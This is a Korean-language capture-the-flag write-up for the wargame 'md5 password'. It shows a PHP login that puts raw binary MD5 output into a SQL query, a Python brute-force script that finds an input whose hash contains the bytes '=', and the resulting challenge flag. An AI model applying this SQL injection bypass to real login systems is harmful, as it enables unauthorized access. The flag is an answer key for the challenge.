# [DreamHack] [wargame.kr] md5 password

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> md5('value', true);

## Analysis

```php+HTML
<?php
 if (isset($_GET['view-source'])) {
  show_source(__FILE__);
  exit();
 }

 if(isset($_POST['ps'])){
  sleep(1);
  include("./lib.php"); # include for $FLAG, $DB_username, $DB_password.
  $conn = mysqli_connect("localhost", $DB_username, $DB_password, "md5_password");
  /*
  
  create table admin_password(
   password char(64) unique
  );
  
  */

  $ps = mysqli_real_escape_string($conn, $_POST['ps']);
  $row=@mysqli_fetch_array(mysqli_query($conn, "select * from admin_password where password='".md5($ps,true)."'"));
  if(isset($row[0])){
   echo "hello admin!"."<br />";
   echo "FLAG : ".$FLAG;
  }else{
   echo "wrong..";
  }
 }
?>
<style>
 input[type=text] {width:200px;}
</style>
<br />
<br />
<form method="post" action="./index.php">
password : <input type="text" name="ps" /><input type="submit" value="login" />
</form>
<div><a href='?view-source'>get source</a></div>
```

`$ps`에 `md5($ps,true)`로 해시를 씌워서 SQL 쿼리에 넣는다. 이 값이 `admin_password`에 있는 값과 일치하면 플래그를 획득할 수 있는데, 패스워드를 맞출 수는 없고 `md5()` 함수의 특징을 이용한 SQL injection으로 해결해야 한다.

## Exploit

`md5()` 함수의 두 번째 인자에 `true`를 전달하면 함수의 반환값은 16진수 문자열이 아니라 바이트 문자열로 반환된다.

```php
<?php
echo md5('aaaa', true); // result: t�s7EB��?��f=��
?>
```

```php
<?php
echo md5('aaaa', false); // result: 74b87337454200d4d33f80c4663dc5e5
?>
```

만약 해시 결과에 `'='`라는 문자열이 포함된다면, 쿼리는 `select * from admin_password where password='???'='***'`가 된다. `password='???'`의 결과는 false이고, `false='***'`는 true이므로, 결과적으로 쿼리는 `select * from admin_password where true`가 된다. 그러면 플래그를 획득할 수 있다.

md5 해시를 씌운 결과에 `'='`가 포함되는 문자열을 찾아서 넣으면 된다.

```python
import hashlib

ps = 0

while 1:
    hash_result = hashlib.md5()
    hash_result.update(str(ps).encode())
    
    if b'\'=\'' in hash_result.digest():
        break
    else:
        ps += 1

print(ps)
```

```
$ python3 solve.py
1839431
```

![image](https://user-images.githubusercontent.com/102066383/164066476-040e8aa2-47e1-4889-a397-91272ebf98fc.png)

![image](https://user-images.githubusercontent.com/102066383/164066510-8ac57578-66d5-4f81-bc7d-6df0bd93c761.png)

```
flag: DH{9d6745675a079f8cb20347e29138720df37e185f}
```
